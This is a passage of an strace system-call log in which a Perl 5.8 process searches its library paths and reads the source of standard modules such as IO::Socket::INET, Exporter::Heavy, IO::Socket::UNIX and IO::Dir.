$val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
5970  07:11:35.466502 _llseek(6, 6698, [6698], SEEK_SET) = 0
5970  07:11:35.466519 _llseek(6, 0, [6698], SEEK_CUR) = 0
5970  07:11:35.466530 close(6)          = 0
5970  07:11:35.466550 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466577 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466591 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466604 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466618 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466631 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466646 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466658 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466671 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466683 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466697 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.466710 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
5970  07:11:35.466731 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.466746 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.466757 _llseek(6, 0, [0], SEEK_CUR) = 0
5970  07:11:35.466774 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
5970  07:11:35.467140 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467160 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467173 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467186 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467200 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467213 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467230 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467242 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467255 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467267 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467302 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467328 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467342 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.467355 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
5970  07:11:35.467376 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.467391 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.467402 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.468030 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
5970  07:11:35.468907 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
5970  07:11:35.469284 brk(0x829c000)    = 0x829c000
5970  07:11:35.469720 read(8, "", 4096) = 0
5970  07:11:35.469740 close(8)          = 0
5970  07:11:35.470965 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
5970  07:11:35.477396 _llseek(6, 6496, [6496], SEEK_SET) = 0
5970  07:11:35.487011 _llseek(6, 0, [6496], SEEK_CUR) = 0
5970  07:11:35.487025 close(6)          = 0
5970  07:11:35.487098 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487115 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487130 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487144 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487158 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487179 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487194 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487207 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487221 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487234 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487247 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.487261 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
5970  07:11:35.487285 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.487300 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.487313 _llseek(6, 0, [0], SEEK_CUR) = 0
5970  07:11:35.487330 brk(0x82bd000)    = 0x82bd000
5970  07:11:35.487347 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
5970  07:11:35.488162 _llseek(6, 1386, [1386], SEEK_SET) = 0
5970  07:11:35.497328 _llseek(6, 0, [1386], SEEK_CUR) = 0
5970  07:11:35.497328 close(6)          = 0
5970  07:11:35.497328 stat64("/etc/perl/IO/Dir.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497329 stat64("/etc/perl/IO/Dir.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497329 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497329 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497329 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497329 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497330 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497336 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497349 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497361 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497374 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.497391 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
5970  07:11:35.497411 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.497426 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.497437 _llseek(6, 0, [0], SEEK_CUR) = 0
5970  07:11:35.497456 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) 